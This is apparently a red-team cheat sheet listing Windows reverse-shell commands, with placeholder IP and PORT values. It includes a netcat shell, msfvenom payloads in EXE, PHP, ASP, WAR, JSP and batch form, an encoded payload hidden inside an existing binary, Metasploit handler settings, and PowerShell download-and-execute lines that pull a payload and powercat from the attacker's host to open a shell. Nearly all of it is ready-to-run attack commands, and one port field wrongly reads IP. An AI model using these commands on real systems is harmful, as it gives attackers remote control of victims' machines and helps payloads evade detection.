WINDOWS REVERSE SHELLS

The following are ways to get reverse shells back to your red team device. All IP and PORT should be changed to your listening box

NC

nc.exe -e cmd.exe IP PORT

Msfvenom Standard meterpreter

msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell_reverse.exe

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

Msfvenom HTTPS Meterpreter

msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe -o met_https_reverse.exe

Msfvenom non-staged payload

msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell_reverse_tcp.exe

use exploit/multi/handler

set payload windows/shell_reverse_tcp

Msfvenom staged payload

msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe -o staged_reverse_tcp.exe

use exploit/multi/handler

set payload windows/shell/reverse_tcp

Msfvenom payload in binary

msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -e x86/shikata_ga_nai -i 9 -x "/binary.exe" -o payload_binary.exe

Msfvenom PHP

msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=IP -f raw > shell.php

Msfvenom ASP

msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp

Msfvenom WAR

msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war

Msfvenom JSP

msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp

Msfvenom Batch File

Attacking machine: msfvenom -p cmd/windows/reverse_powershell lhost=IP lport=PORT > 1.bat

Target box: powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://IP/1.bat'))

msf exploit(windows/misc/hta_server) > set lhost IP

msf exploit(windows/misc/hta_server) > exploit

msf exploit (web_delivery)> set lhost IP

msf exploit (web_delivery)>exploit

Powershell.exe

Attacking machine: git clone https://github.com/besimorhino/powercat.git

Attacking machine: python -m SimpleHTTPServer 80

Target box: powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://IP/powercat.ps1');powercat -c IP -p PORT -e cmd"
